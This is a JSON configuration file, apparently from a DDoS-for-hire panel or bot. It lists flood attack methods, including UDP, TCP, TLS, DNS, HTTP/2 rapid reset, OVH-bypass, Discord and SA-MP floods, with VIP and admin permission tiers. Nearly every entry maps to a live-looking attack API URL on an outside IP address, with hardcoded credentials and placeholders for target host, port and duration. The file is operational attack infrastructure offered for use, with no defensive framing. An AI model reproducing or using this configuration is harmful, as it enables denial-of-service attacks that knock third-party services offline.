[
	{
		"name": "udp-pps",
		"time": 1000,
		"description": "Udp PPS Flood",
		"group": "test",
		"default port": 80,
		"default time": 100,
		"permission": [],
		"api": [
			"http://5.180.106.47/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=udp"

		]
	},
	{
		"name": "tcp-legit",
		"time": 1000,
		"description": "Tcp Legit Flood",
		"group": "test",
		"default port": 80,
		"default time": 100,
		"permission": [],
		"api": [
			""
		]
	},
		{
		"name": "tls-max",
		"time": 1000,
		"description": "TLS FLOOD MAX",
        "permission": ["vip"],
        "api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=tls"

		]
	},
	{
		"name": "socket",
		"time": 120,
		"description": "Socket Flood",
		"group": "test",
		"default port": 80,
		"default time": 100,
		"permission": [],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=socket"
		]
	},
	{
		"name": "discord",
		"time": 1000,
		"description": "Discord Flood",
		"group": "test",
		"default port": 80,
		"default time": 100,
		"permission": [],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=discord"
		]
	},
	{
		"name": "samp",
		"time": 1000,
		"description": "Samp Flood",
		"group": "test",
		"default port": 80,
		"default time": 100,
		"permission": [],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=samp"
		]
	},
	{
		"name": "darcy-flooder",
		"time": 1000,
		"description": "Darcy Flood ",
		"permission": ["vip"],
		"api": [
      "http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=http1",
      "http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=rapidreset"
		]
	},
	{
		"name": "tls",
		"time": 1000,
		"description": "Tls Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=tls"
		]
	},
	{
		"name": "rapidreset",
		"time": 1000,
		"description": "Httpddos Bypass Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=rapidreset"
		]
	},
	{
		"name": "https-bypass",
		"time": 1000,
		"description": "Bypass Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=https-lite"
		]
	},
	{
		"name": "https-strong",
		"time": 1000,
		"description": "Https-Lite Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=https-lite"
		]
	},
	{
		"name": "ovh",
		"time": 1000,
		"description": "Ovh Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=443&time=<<$time>>&method=ovhack"
		]
	},
	{
		"name": "dns",
		"time": 1000,
		"description": "Dns Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=dns"
		]
	},
	{
		"name": "tcp",
		"time": 1000,
		"description": "Tcp Flood",
		"permission": ["vip"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-mix"
		]
	},
	{
		"name": "http2",
		"time": 1000,
		"description": "http2 Flood",
		"permission": ["vip", "admin"],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http2"
		]
	},
	{
		"name": "tls-killer",
		"time": 1000,
		"description": "Tls Flood",
		"permission": [],
		"api": [
			"http://5.42.100.115/api/attack?username=syrox&key=syrox&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tlskill"
		]
	}
]
